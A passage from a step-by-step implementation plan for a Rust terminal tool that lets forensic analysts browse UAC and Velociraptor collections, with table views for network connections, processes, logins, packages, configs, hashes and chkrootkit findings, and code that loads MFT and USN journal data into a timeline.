        TimelineSource::ProcessList => Color::LightRed,
        TimelineSource::Registry => Color::LightCyan,
        TimelineSource::EventLog => Color::White,
    }
}

fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Utc};
    DateTime::from_timestamp(ts, 0)
        .map(|dt: DateTime<Utc>| dt.format("%Y-%m-%dT%H:%M:%S").to_string())
        .unwrap_or_else(|| format!("{ts}"))
}

fn truncate_path(path: &str, max_len: usize) -> String {
    if path.len() <= max_len {
        path.to_string()
    } else {
        format!("...{}", &path[path.len() - max_len + 3..])
    }
}
```

- [ ] **Step 3: Add views module to mod.rs**

Update `crates/rt-navigator/src/investigation/mod.rs` module declarations:

```rust
pub mod alerts;
pub mod dashboard;
pub mod data;
pub mod timeline;
pub mod views;
```

- [ ] **Step 4: Run tests**

Run: `cargo test -p rt-navigator --lib -- investigation`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add crates/rt-navigator/src/investigation/
git commit -m "feat(nav): add supertimeline view with source filtering and color-coded sources"
```

---

## Task 6: Remaining Artifact Views (Network, Process, Logins, Packages, Configs, Hashes, Chkrootkit)

**Files:**
- Create: `crates/rt-navigator/src/investigation/views/network.rs`
- Create: `crates/rt-navigator/src/investigation/views/process.rs`
- Create: `crates/rt-navigator/src/investigation/views/logins.rs`
- Create: `crates/rt-navigator/src/investigation/views/packages.rs`
- Create: `crates/rt-navigator/src/investigation/views/configs.rs`
- Create: `crates/rt-navigator/src/investigation/views/hashes.rs`
- Create: `crates/rt-navigator/src/investigation/views/chkrootkit.rs`

Each view follows the same pattern: a Table widget with appropriate columns, highlight for selected row, and optional detail panel. All views are simple table renderers — the state machine handles cursor/scrolling.

- [ ] **Step 1: Write network.rs**

Create `crates/rt-navigator/src/investigation/views/network.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Network ({} connections) ", app.data.network.len());

    let header = Row::new(vec!["Proto", "Local", "Remote", "State", "PID"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.network.len());

    let rows: Vec<Row<'_>> = app.data.network[start..end]
        .iter()
        .enumerate()
        .map(|(i, conn)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            Row::new(vec![
                conn.protocol.as_deref().unwrap_or("-").to_string(),
                format!(
                    "{}:{}",
                    conn.local_address.as_deref().unwrap_or("*"),
                    conn.local_port.as_deref().unwrap_or("*"),
                ),
                conn.remote_address.as_deref().unwrap_or("*").to_string(),
                conn.state.as_deref().unwrap_or("-").to_string(),
                conn.pid.as_deref().unwrap_or("-").to_string(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Length(6),
        Constraint::Length(22),
        Constraint::Length(22),
        Constraint::Length(12),
        Constraint::Min(8),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 2: Write process.rs**

Create `crates/rt-navigator/src/investigation/views/process.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Processes ({}) ", app.data.processes.len());

    let header = Row::new(vec!["User", "PID", "CPU%", "MEM%", "TTY", "Command"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.processes.len());

    let rows: Vec<Row<'_>> = app.data.processes[start..end]
        .iter()
        .enumerate()
        .map(|(i, proc)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            Row::new(vec![
                proc.user.as_deref().unwrap_or("-").to_string(),
                proc.pid.as_deref().unwrap_or("-").to_string(),
                proc.cpu.as_deref().unwrap_or("-").to_string(),
                proc.mem.as_deref().unwrap_or("-").to_string(),
                proc.tty.as_deref().unwrap_or("-").to_string(),
                proc.command.clone(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Length(10),
        Constraint::Length(7),
        Constraint::Length(6),
        Constraint::Length(6),
        Constraint::Length(8),
        Constraint::Min(20),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 3: Write logins.rs**

Create `crates/rt-navigator/src/investigation/views/logins.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Logins ({}) ", app.data.logins.len());

    let header = Row::new(vec!["User", "Terminal", "From", "Login", "Logout", "Duration"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.logins.len());

    let rows: Vec<Row<'_>> = app.data.logins[start..end]
        .iter()
        .enumerate()
        .map(|(i, record)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            Row::new(vec![
                record.user.as_deref().unwrap_or("-").to_string(),
                record.terminal.as_deref().unwrap_or("-").to_string(),
                record.from.as_deref().unwrap_or("-").to_string(),
                record.login_time.as_deref().unwrap_or("-").to_string(),
                record.logout_time.as_deref().unwrap_or("-").to_string(),
                record.duration.as_deref().unwrap_or("-").to_string(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Length(12),
        Constraint::Length(10),
        Constraint::Length(16),
        Constraint::Length(20),
        Constraint::Length(20),
        Constraint::Min(10),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 4: Write packages.rs**

Create `crates/rt-navigator/src/investigation/views/packages.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Packages ({}) ", app.data.packages.len());

    let header = Row::new(vec!["Name", "Version", "Source"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.packages.len());

    let rows: Vec<Row<'_>> = app.data.packages[start..end]
        .iter()
        .enumerate()
        .map(|(i, pkg)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            Row::new(vec![
                pkg.name.clone(),
                pkg.version.as_deref().unwrap_or("-").to_string(),
                pkg.source.as_deref().unwrap_or("-").to_string(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Min(30),
        Constraint::Length(20),
        Constraint::Length(15),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 5: Write configs.rs**

Create `crates/rt-navigator/src/investigation/views/configs.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Configs ({}) ", app.data.configs.len());

    let header = Row::new(vec!["Path", "Size"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.configs.len());

    let rows: Vec<Row<'_>> = app.data.configs[start..end]
        .iter()
        .enumerate()
        .map(|(i, config)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            let content_len = config
                .content
                .as_ref()
                .map_or(0, |c| c.len());
            Row::new(vec![
                config.path.clone(),
                format!("{content_len} bytes"),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Min(40),
        Constraint::Length(15),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 6: Write hashes.rs**

Create `crates/rt-navigator/src/investigation/views/hashes.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Hashes ({}) ", app.data.hashes.len());

    let header = Row::new(vec!["Path", "Hash", "Algorithm"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.hashes.len());

    let rows: Vec<Row<'_>> = app.data.hashes[start..end]
        .iter()
        .enumerate()
        .map(|(i, hash)| {
            let style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            Row::new(vec![
                hash.path.clone(),
                hash.hash.as_deref().unwrap_or("-").to_string(),
                hash.algorithm.as_deref().unwrap_or("-").to_string(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Min(30),
        Constraint::Length(66),
        Constraint::Length(8),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 7: Write chkrootkit.rs**

Create `crates/rt-navigator/src/investigation/views/chkrootkit.rs`:

```rust
use ratatui::layout::{Constraint, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let title = format!(" Chkrootkit ({}) ", app.data.chkrootkit.len());

    let header = Row::new(vec!["Check", "Status", "Detail"])
        .style(Style::default().add_modifier(Modifier::BOLD));

    let visible_height = area.height.saturating_sub(3) as usize;
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.data.chkrootkit.len());

    let rows: Vec<Row<'_>> = app.data.chkrootkit[start..end]
        .iter()
        .enumerate()
        .map(|(i, finding)| {
            let is_infected = finding
                .status
                .as_deref()
                .unwrap_or("")
                .contains("INFECTED");
            let base_style = if start + i == app.selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };
            let style = if is_infected {
                base_style.fg(Color::Red)
            } else {
                base_style
            };
            Row::new(vec![
                finding.check_name.as_deref().unwrap_or("-").to_string(),
                finding.status.as_deref().unwrap_or("-").to_string(),
                finding.detail.as_deref().unwrap_or("-").to_string(),
            ])
            .style(style)
        })
        .collect();

    let widths = [
        Constraint::Length(20),
        Constraint::Length(15),
        Constraint::Min(30),
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}
```

- [ ] **Step 8: Run tests and build check**

Run: `cargo test -p rt-navigator --lib -- investigation && cargo check -p rt-navigator`
Expected: All tests PASS, no compile errors

- [ ] **Step 9: Commit**

```bash
git add crates/rt-navigator/src/investigation/views/
git commit -m "feat(nav): add all artifact drill-in views (network, process, logins, packages, configs, hashes, chkrootkit)"
```

---

## Task 7: Detail Panel + Workbench Rendering Wrapper

**Files:**
- Create: `crates/rt-navigator/src/investigation/detail.rs`
- Create: `crates/rt-navigator/src/investigation/workbench_ui.rs`
- Modify: `crates/rt-navigator/src/investigation/mod.rs`

This task wires together the header, footer, view dispatch, and detail panel into a unified rendering function.

- [ ] **Step 1: Write detail.rs**

Create `crates/rt-navigator/src/investigation/detail.rs`:

```rust
use ratatui::layout::Rect;
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Paragraph, Wrap};
use ratatui::Frame;

use super::{WorkbenchApp, WorkbenchView};

/// Render a detail panel for the selected item in the current view.
/// For Timeline, detail is handled in supertimeline.rs directly.
pub fn draw_detail(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let content = match app.current_view() {
        WorkbenchView::Network => network_detail(app),
        WorkbenchView::Processes => process_detail(app),
        WorkbenchView::Logins => login_detail(app),
        WorkbenchView::Configs => config_detail(app),
        _ => vec![Line::from("Select an item to see details")],
    };

    let detail = Paragraph::new(content)
        .block(Block::default().borders(Borders::ALL).title(" Detail "))
        .wrap(Wrap { trim: false });

    frame.render_widget(detail, area);
}

fn network_detail(app: &WorkbenchApp) -> Vec<Line<'static>> {
    let Some(conn) = app.data.network.get(app.selected) else {
        return vec![Line::from("No selection")];
    };
    vec![
        detail_line("Protocol", conn.protocol.as_deref().unwrap_or("-")),
        detail_line(
            "Local",
            &format!(
                "{}:{}",
                conn.local_address.as_deref().unwrap_or("*"),
                conn.local_port.as_deref().unwrap_or("*"),
            ),
        ),
        detail_line("Remote", conn.remote_address.as_deref().unwrap_or("*")),
        detail_line("State", conn.state.as_deref().unwrap_or("-")),
        detail_line("PID", conn.pid.as_deref().unwrap_or("-")),
    ]
}

fn process_detail(app: &WorkbenchApp) -> Vec<Line<'static>> {
    let Some(proc) = app.data.processes.get(app.selected) else {
        return vec![Line::from("No selection")];
    };
    vec![
        detail_line("User", proc.user.as_deref().unwrap_or("-")),
        detail_line("PID", proc.pid.as_deref().unwrap_or("-")),
        detail_line("CPU%", proc.cpu.as_deref().unwrap_or("-")),
        detail_line("MEM%", proc.mem.as_deref().unwrap_or("-")),
        detail_line("TTY", proc.tty.as_deref().unwrap_or("-")),
        detail_line("Start", proc.start_time.as_deref().unwrap_or("-")),
        Line::from(""),
        detail_line("Command", &proc.command),
    ]
}

fn login_detail(app: &WorkbenchApp) -> Vec<Line<'static>> {
    let Some(record) = app.data.logins.get(app.selected) else {
        return vec![Line::from("No selection")];
    };
    vec![
        detail_line("User", record.user.as_deref().unwrap_or("-")),
        detail_line("Terminal", record.terminal.as_deref().unwrap_or("-")),
        detail_line("From", record.from.as_deref().unwrap_or("-")),
        detail_line("Login", record.login_time.as_deref().unwrap_or("-")),
        detail_line("Logout", record.logout_time.as_deref().unwrap_or("-")),
        detail_line("Duration", record.duration.as_deref().unwrap_or("-")),
    ]
}

fn config_detail(app: &WorkbenchApp) -> Vec<Line<'static>> {
    let Some(config) = app.data.configs.get(app.selected) else {
        return vec![Line::from("No selection")];
    };
    let preview = config
        .content
        .as_deref()
        .unwrap_or("")
        .chars()
        .take(500)
        .collect::<String>();
    vec![
        detail_line("Path", &config.path),
        Line::from(""),
        Line::from(Span::styled(
            "Content preview:",
            Style::default().add_modifier(Modifier::BOLD),
        )),
        Line::from(preview),
    ]
}

fn detail_line(label: &str, value: &str) -> Line<'static> {
    Line::from(vec![
        Span::styled(
            format!("{label}: "),
            Style::default().add_modifier(Modifier::BOLD),
        ),
        Span::raw(value.to_string()),
    ])
}
```

- [ ] **Step 2: Write workbench_ui.rs**

Create `crates/rt-navigator/src/investigation/workbench_ui.rs`:

```rust
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Paragraph, Tabs};
use ratatui::Frame;

use super::dashboard::draw_dashboard;
use super::detail::draw_detail;
use super::views::draw_view;
use super::{WorkbenchApp, WorkbenchView};

/// Main rendering entry point for the investigation workbench.
pub fn draw_workbench(frame: &mut Frame, app: &mut WorkbenchApp) {
    let area = frame.area();

    // If in MFT tree view, delegate to existing ui::draw with a header
    if app.current_view() == WorkbenchView::MftTree {
        if let Some(ref mut mft_app) = app.mft_app {
            // Draw the existing MFT tree view
            crate::ui::draw(frame, mft_app);
        }
        return;
    }

    let chunks = Layout::vertical([
        Constraint::Length(3), // header + tab bar
        Constraint::Min(5),   // main content
        Constraint::Length(1), // footer
    ])
    .split(area);

    draw_header(frame, app, chunks[0]);
    draw_body(frame, app, chunks[1]);
    draw_footer(frame, app, chunks[2]);
}

fn draw_header(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let meta = &app.data.metadata;

    let title_line = Line::from(vec![
        Span::styled(
            " RT Investigation: ",
            Style::default().add_modifier(Modifier::BOLD),
        ),
        Span::raw(&meta.hostname),
        Span::raw("   OS: "),
        Span::raw(&meta.os),
        Span::raw(format!("   {} ", &meta.collection_tool)),
    ]);

    // Tab bar
    let tab_titles: Vec<String> = app
        .available_views
        .iter()
        .enumerate()
        .map(|(i, v)| {
            if i == app.current_view_idx {
                format!("[{}]", v.label())
            } else {
                v.label().to_string()
            }
        })
        .collect();

    let tabs_line = Line::from(
        tab_titles
            .iter()
            .enumerate()
            .flat_map(|(i, title)| {
                let style = if i == app.current_view_idx {
                    Style::default()
                        .fg(Color::Cyan)
                        .add_modifier(Modifier::BOLD)
                } else {
                    Style::default().fg(Color::DarkGray)
                };
                vec![Span::styled(title.clone(), style), Span::raw("  ")]
            })
            .collect::<Vec<Span>>(),
    );

    let header = Paragraph::new(vec![title_line, tabs_line])
        .block(Block::default().borders(Borders::BOTTOM));

    frame.render_widget(header, area);
}

fn draw_body(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    match app.current_view() {
        WorkbenchView::Dashboard => draw_dashboard(frame, app, area),
        WorkbenchView::Timeline => draw_view(frame, app, area),
        _ => {
            // Views with optional detail panel
            if app.show_detail {
                let chunks = Layout::horizontal([
                    Constraint::Percentage(65),
                    Constraint::Percentage(35),
                ])
                .split(area);
                draw_view(frame, app, chunks[0]);
                draw_detail(frame, app, chunks[1]);
            } else {
                draw_view(frame, app, area);
            }
        }
    }
}

fn draw_footer(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let view = app.current_view();
    let count = app.current_item_count();

    let mut spans = vec![
        Span::raw(" [Tab] switch view"),
        Span::raw("  [Esc] dashboard"),
    ];

    if view == WorkbenchView::Timeline {
        spans.push(Span::raw("  [f] filter"));
    }

    spans.extend([
        Span::raw("  [s] sort"),
        Span::raw("  [/] search"),
        Span::raw("  [q] quit"),
    ]);

    if app.search_mode {
        spans.push(Span::styled(
            format!("  /{}", app.search_query),
            Style::default().fg(Color::Yellow),
        ));
    }

    spans.push(Span::styled(
        format!("  {count} items"),
        Style::default().fg(Color::DarkGray),
    ));

    let footer = Paragraph::new(Line::from(spans));
    frame.render_widget(footer, area);
}
```

- [ ] **Step 3: Update mod.rs**

Add to module declarations in `crates/rt-navigator/src/investigation/mod.rs`:

```rust
pub mod alerts;
pub mod dashboard;
pub mod data;
pub mod detail;
pub mod timeline;
pub mod views;
pub mod workbench_ui;
```

- [ ] **Step 4: Build check**

Run: `cargo check -p rt-navigator`
Expected: No compile errors

- [ ] **Step 5: Commit**

```bash
git add crates/rt-navigator/src/investigation/
git commit -m "feat(nav): add detail panel and unified workbench rendering"
```

---

## Task 8: Wire into main.rs + Integration Test

**Files:**
- Modify: `crates/rt-navigator/src/main.rs`
- Modify: `crates/rt-navigator/Cargo.toml` (already done in Task 1)

- [ ] **Step 1: Update main.rs with collection detection**

Update `crates/rt-navigator/src/main.rs`. Add at the top (after existing use statements):

```rust
extern crate rt_parser_uac;
extern crate rt_parser_velociraptor;

mod investigation;
```

Then modify the `main()` function to add collection detection before the existing MFT path:

```rust
fn main() -> Result<()> {
    let cli = Cli::parse();

    // -- Try collection detection first -----------------------------------
    if let Some(ref path) = cli.path {
        if path.is_file() {
            if let Some(data) = try_open_collection(path)? {
                return run_workbench(data);
            }
        }
    }

    // -- Fall through to existing MFT tree mode ---------------------------
    let sources = resolve_sources(&cli)?;
    // ... (existing code unchanged)
```

Add the collection detection function:

```rust
fn try_open_collection(path: &std::path::Path) -> Result<Option<investigation::data::InvestigationData>> {
    use rt_unpack::registry;

    // Probe all registered providers
    let providers = registry::probe_all(path);
    if providers.is_empty() {
        return Ok(None);
    }

    // Use the highest-confidence provider
    let (provider, _confidence) = &providers[0];
    eprintln!("  Detected collection: {}", provider.name());
    eprintln!("  Extracting...");

    let manifest = provider.open(path)?;
    let extracted_root = manifest.extracted_root.clone();
    eprintln!("  Extracted to {}", extracted_root.display());

    // Load as UAC collection (works for UAC, partial for Velociraptor)
    let mut data = investigation::data::load_uac_collection(&extracted_root);

    // For Velociraptor: try to find and load $MFT
    if provider.name().contains("elociraptor") {
        try_load_mft(&extracted_root, &mut data)?;
    }

    Ok(Some(data))
}

fn try_load_mft(
    extracted_root: &std::path::Path,
    data: &mut investigation::data::InvestigationData,
) -> Result<()> {
    use investigation::timeline::{mft_to_events, usn_to_events};

    // Look for $MFT in uploads/ntfs/ or uploads/
    let mft_candidates = [
        extracted_root.join("uploads/ntfs/%5C%5C.%5CC%3A/$MFT"),
        extracted_root.join("uploads/ntfs/$MFT"),
        extracted_root.join("uploads/$MFT"),
    ];

    let mft_path = mft_candidates.iter().find(|p| p.exists());

    if let Some(mft_path) = mft_path {
        eprintln!("  Loading $MFT from {}", mft_path.display());
        let mut tree = FileTree::from_mft(mft_path)?;

        // Look for $UsnJrnl
        let usn_candidates = [
            extracted_root.join("uploads/ntfs/%5C%5C.%5CC%3A/$Extend/$UsnJrnl%3A$J"),
            extracted_root.join("uploads/ntfs/$Extend/$UsnJrnl"),
        ];
        let mut usn_records = Vec::new();
        if let Some(usn_path) = usn_candidates.iter().find(|p| p.exists()) {
            usn_records = enrich_with_usnjrnl(&mut tree, usn_path);
        }

        // Convert MFT + USN to timeline events
        let mut mft_events = mft_to_events(&tree);
        if !usn_records.is_empty() {
            mft_events.extend(usn_to_events(&usn_records));
        }

        // Merge into existing timeline and re-sort
        data.timeline.extend(mft_events);
        data.timeline.sort_by_key(|e| e.timestamp);

        // Run heuristics on MFT
        let config = HeuristicsConfig::default();
        let anomaly_index = heuristics::run_tier1(&tree, &config);

        data.mft_tree = Some(tree);
        data.anomaly_index = Some(anomaly_index);

        eprintln!("  MFT loaded, {} total timeline events", data.timeline.len());
    }

    Ok(())
}
```

Add the workbench runner:

```rust
fn run_workbench(data: investigation::data::InvestigationData) -> Result<()> {
    eprintln!(
        "  {} timeline events, {} alerts",
        data.timeline.len(),
        data.alerts.len(),
    );

    let mft_app = if data.mft_tree.is_some() {
        // Create an MFT App for delegation in MftTree view
        let tree = data.mft_tree.as_ref().expect("checked above").clone();
        let anomaly_index = data
            .anomaly_index
            .as_ref()
            .cloned()
            .unwrap_or_default();
        Some(App::new(tree, anomaly_index)?)
    } else {
        None
    };

    let mut workbench = investigation::WorkbenchApp::new(data, mft_app);

    let mut terminal = ratatui::init();
    let result = run_workbench_loop(&mut terminal, &mut workbench);
    ratatui::restore();

    result
}

fn run_workbench_loop(
    terminal: &mut ratatui::DefaultTerminal,
    app: &mut investigation::WorkbenchApp,
) -> Result<()> {
    use investigation::workbench_ui::draw_workbench;

    loop {
        terminal.draw(|frame| draw_workbench(frame, app))?;

        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                if matches!(app.handle_key(key), Action::Quit) {
                    return Ok(());
                }
            }
        }

        // If MFT app is active, poll its search results
        if let Some(ref mut mft_app) = app.mft_app {
            mft_app.poll_search_results();
            mft_app.fire_debounced_search();
        }
    }
}
```

- [ ] **Step 2: Build and test**

Run: `cargo build -p rt-navigator && cargo test -p rt-navigator`
Expected: Build succeeds, all tests PASS

- [ ] **Step 3: Manual smoke test with UAC data**

Run: `cargo run -p rt-navigator -- tests/data/uac-vbox-linux-20260324193807.tar.gz`
Expected: Extracts collection, shows dashboard with supertimeline count, alerts, and drill-in views. Tab cycles through available views. `q` quits.

If the test data path doesn't match (UAC provider may nest the extracted directory), check the logs and adjust paths in `load_uac_collection` as needed.

- [ ] **Step 4: Commit**

```bash
git add crates/rt-navigator/
git commit -m "feat(nav): wire investigation workbench into main.rs — one command, full investigation"
```

---

## Summary

| Task | Description | Key Files |
|------|-------------|-----------|
| 1 | TimelineEvent types + conversion functions | `investigation/timeline.rs` |
| 2 | InvestigationData + CollectionMetadata + Alert detection | `investigation/data.rs`, `investigation/alerts.rs` |
| 3 | WorkbenchApp state machine | `investigation/mod.rs` |
| 4 | Dashboard rendering | `investigation/dashboard.rs` |
| 5 | Supertimeline view + view dispatch | `investigation/views/mod.rs`, `views/supertimeline.rs` |
| 6 | Artifact drill-in views | `views/network.rs`, `views/process.rs`, `views/logins.rs`, `views/packages.rs`, `views/configs.rs`, `views/hashes.rs`, `views/chkrootkit.rs` |
| 7 | Detail panel + workbench rendering wrapper | `investigation/detail.rs`, `investigation/workbench_ui.rs` |
| 8 | Wire into main.rs + integration test | `main.rs` |
